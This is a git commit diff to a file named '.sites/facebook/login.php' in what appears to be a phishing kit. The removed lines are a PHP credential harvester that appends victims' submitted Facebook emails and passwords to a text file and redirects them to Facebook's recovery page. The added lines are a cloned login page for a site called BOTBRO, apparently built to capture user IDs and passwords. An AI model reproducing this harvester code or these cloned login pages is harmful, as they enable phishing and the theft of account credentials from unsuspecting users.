0e9e979ec55d606eb55d85d8f78044b3a3651a29
JUNAYED ALAM BISWAS <160825002+junayedalam09@users.noreply.github.com>
2025-02-03 09:32:17 +0530

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,5 +1,84 @@
-<?php 
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
-exit();
-?>
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><meta charset="UTF-8" />
+    <!-- Responsive Meta -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <!-- favicon & bookmark -->
+    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+    <!-- Font Family -->
+    <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700" rel="stylesheet" /><link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet" /><link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800" rel="stylesheet" />
+    <!-- Website Title -->
+    <title>
+	BOTBRO
+</title>
+     <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5367550871273483"
+     crossorigin="anonymous"></script> -->
+    <!-- Stylesheets Start -->
+    <link rel="stylesheet" href="web/css/fontawesome.min.css" type="text/css" /><link rel="stylesheet" href="web/css/bootstrap.css" type="text/css" /><link rel="stylesheet" href="web/css/animate.css" type="text/css" /><link rel="stylesheet" href="web/css/owl.carousel.min.css" type="text/css" /><link rel="stylesheet" href="web/css/style.css" type="text/css" /><link rel="stylesheet" href="web/style.css" type="text/css" /><link rel="stylesheet" href="web/css/responsive.css" type="text/css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+</head>
+<body>
+    <form name="form1" method="post" action="./signin" id="form1">
+<div>
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="YsUe59V8d0SIQOcVNJuaESdrYiWZiZqyes9OMzPUmLFPqOf67NR/38xPKguywwGPF5PtPSy29yLYpQ4EXGwgp6GTTTqfo4Omo/ekdXP5GXKz8WgUiIVdBXpVSCZ9mvWjFVNVE83QHqSvfQDF4MYEJjLf5BIEG2uGFNbqQ7vyw8uhdyir3RnICmE/2f4SlbgvhWvsPm/lZqZS7L/N//dVOzOMG4a3ZbKD35MjyiMihceBFY8lp7xQ1J1eboYEKlgVulAjrA62S8qtsxNKh3rIeENKBTE/AVv1+vVcP2Z6mmBExY1R" />
+</div>
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="ECDA716A" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+</div>
+        <div class="wrapper login-page style-3" id="top">
+            <div class="cp-container">
+                <div class="form-part">
+                   <div class="cp-header text-center">
+                        <div class="logo"><a href="https://botbro.biz/" title="back to website">
+                                <img class="light" src="/web/images/home.png" alt="BOTBRO" style="width: 44px;"></a>
+                            
+                        </div><div class="logo">
+                            <a href="/">
+                                <img class="light" src="/web/images/logo.png" alt="BOTBRO"></a>
+                        </div>
+                    </div>
+                    <div class="cp-heading text-center">
+                        <h5>Welcome Back :)</h5>
+                        <p>To keep connected with us please login with your personal information by user id and password.</p>
+                    </div>
+                    <div class="cp-body">
+                      
+                        <div class="form-group username-field">
+                            <div class="form-field">
+                                <input name="txtUserId" type="text" id="txtUserId" class="form-control" placeholder="Userid" required="" />
+                            </div>
+                        </div>
+                        <div class="form-group password-field">
+                            <div class="form-field">
+                                <input name="txtPassword" type="password" id="txtPassword" class="form-control" placeholder="Password" required="" value="" />
+                            </div>
+                        </div>
+                       
+                        <div class="form-group">
+                            <div id="Panel1">
+	
+                                
+                            <span id="ctrlGoogleReCaptcha"><div class='g-recaptcha' data-sitekey='6LeILXEhAAAAAMBW_Lk7PtPpBTx27G5TEy8ze2Gi'></div></span>
+</div>
+                           
+                            <input type="submit" name="btnSubmit" value="Login" id="btnSubmit" class="btn mt-2" />
+                        </div>
+                        <div class="form-group">
+                            <p class="text-center"><a class="forgot-link" href="forgot.aspx">Forgot password?</a> or <a href="signup.aspx" class="forgot-link">Sign Up</a></p>
+                        </div>
+
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    
+ <script src="https://www.google.com/recaptcha/api.js" async defer></script></form>
+</body>
+</html>
